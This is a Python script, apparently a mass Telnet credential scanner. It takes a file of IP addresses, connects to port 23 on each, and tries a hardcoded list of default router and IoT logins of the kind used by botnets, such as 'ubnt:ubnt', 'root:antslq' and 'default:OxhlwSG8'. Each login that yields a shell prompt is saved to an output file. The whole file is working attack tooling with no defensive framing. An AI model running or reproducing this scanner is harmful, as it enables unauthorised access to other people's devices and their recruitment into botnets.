import asyncio
import sys

combo = [
    "root:root", "admin:admin", "root:", "admin:", "default:",
    "User:admin", "guest:12345", "admin:1234", "admin:12345",
    "admin:password", "ubnt:ubnt", "guest:guest", "user:user",
    "default:OxhlwSG8", "default:S2fGqNFs", "admin:smcadmin",
    "sysadm:sysadm", "support:support", "root:default",
    "root:password", "adm:", "bin:", "daemon:",
    "root:cat1029", "admin:cat1029", "admin:123456", "root:antslq"
]

async def try_combo(ip: str, username: str, password: str, output_file: str, semaphore: asyncio.Semaphore, lock: asyncio.Lock):
    try:
        async with semaphore:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=5)

            banner = await reader.read(1024)
            if b"ogin" in banner.lower():
                writer.write((username + "\n").encode())
                await writer.drain()
                await asyncio.sleep(0.1)

                prompt = await reader.read(1024)
                if b"assword" in prompt.lower():
                    writer.write((password + "\n").encode())
                    await writer.drain()
                    await asyncio.sleep(0.1)

                    response = await reader.read(1024)
                    decoded = response.decode(errors="ignore")

                    if any(sym in decoded for sym in ["#", "$", ">", "@", "%"]) and "ONT" not in decoded:
                        result = f"{ip}:23 {username}:{password}"
                        print(f"\033[32m[+]\033[0m {result}")
                        async with lock:
                            with open(output_file, "a") as f:
                                f.write(result + "\n")
                        writer.close()
                        await writer.wait_closed()
                        return True

            writer.close()
            await writer.wait_closed()
    except:
        pass
    return False

async def handle_ip(ip: str, output_file: str, semaphore: asyncio.Semaphore, lock: asyncio.Lock):
    for cred in combo:
        if ":" not in cred:
            continue
        username, password = cred.split(":", 1)
        if await try_combo(ip, username, password, output_file, semaphore, lock):
            break

async def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <list.txt> <threads> <output.txt>")
        sys.exit(1)

    ip_list_file = sys.argv[1]
    thread_count = int(sys.argv[2])
    output_file = sys.argv[3]

    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f if line.strip()]

    semaphore = asyncio.Semaphore(thread_count)
    lock = asyncio.Lock()

    tasks = [handle_ip(ip, output_file, semaphore, lock) for ip in ips]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
